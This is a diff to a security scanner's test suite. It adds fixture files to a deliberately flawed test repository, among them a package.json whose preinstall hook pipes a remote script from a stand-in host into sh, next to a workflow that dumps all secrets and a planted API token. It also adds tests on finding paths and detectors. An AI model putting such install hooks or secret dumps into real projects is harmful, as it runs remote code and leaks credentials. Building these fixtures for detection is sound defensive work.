@@ -77,6 +77,18 @@ TREE: dict[str, str] = {
         "          ALL: ${{ toJSON(secrets) }}\n"
     ),
     "requirements.txt": "requests==2.19.1\ndjango==1.11.0\n",
+    "package.json": json.dumps(
+        {
+            "name": "x",
+            "version": "1.0.0",
+            "scripts": {"preinstall": "curl https://x.invalid/s.sh | sh"},
+            "dependencies": {"lodash": "4.17.4"},
+        },
+        indent=2,
+    )
+    + "\n",
+    "sbom.json": json.dumps({"bomFormat": "CycloneDX", "specVersion": "1.5"}) + "\n",
+    "LICENSE": "GNU AFFERO GENERAL PUBLIC LICENSE\nVersion 3, 19 November 2007\n",
     # Assembled at call time: this repository is scanned by the tool it tests.
     ".env": "DEBUG=1\nAPI_TOKEN=" + assemble("kR9mT2nQ8vL4xW7y", "Z3bC6dF1gH5jK8mN") + "\n",
     "package-lock.json": json.dumps(
@@ -159,3 +171,32 @@ def test_the_snippet_comes_from_the_span(located) -> None:
             f"{finding.rule_id}: the span holds {matched[:60]!r} but the "
             f"finding shows {snippet[:60]!r}"
         )
+
+
+def test_every_finding_points_at_something_a_reader_can_open(located) -> None:
+    """A finding without a usable path cannot be followed.
+
+    Not every finding has a span -- one about a dependency belongs to the
+    manifest that declares it, not to a byte range -- but every finding has to
+    name a place. `OPERATIONAL.VCS.UNREADABLE.001` named the empty string, which
+    reaches SARIF as an empty `artifactLocation.uri` and points nowhere at all.
+    `.` is the repository, and that is what a repository-scope notice means.
+    """
+    root, _ = located
+    result = Scanner(Config.default().with_overrides(use_cache=False)).scan(root)
+    unusable = [
+        f.rule_id
+        for f in result.findings
+        if not f.location.path or not (f.location.path == "." or (root / f.location.path).exists())
+    ]
+    assert not unusable, f"findings with no place to go: {sorted(set(unusable))}"
+
+
+def test_the_tree_reaches_the_graph_detectors_too(located) -> None:
+    """Guards the path check above from passing on file findings alone."""
+    root, _ = located
+    result = Scanner(Config.default().with_overrides(use_cache=False)).scan(root)
+    detectors = {f.detector for f in result.findings}
+    assert {"advisory", "lockfile", "manifest"} <= detectors, (
+        f"the graph detectors did not run: got {sorted(detectors)}"
+    )
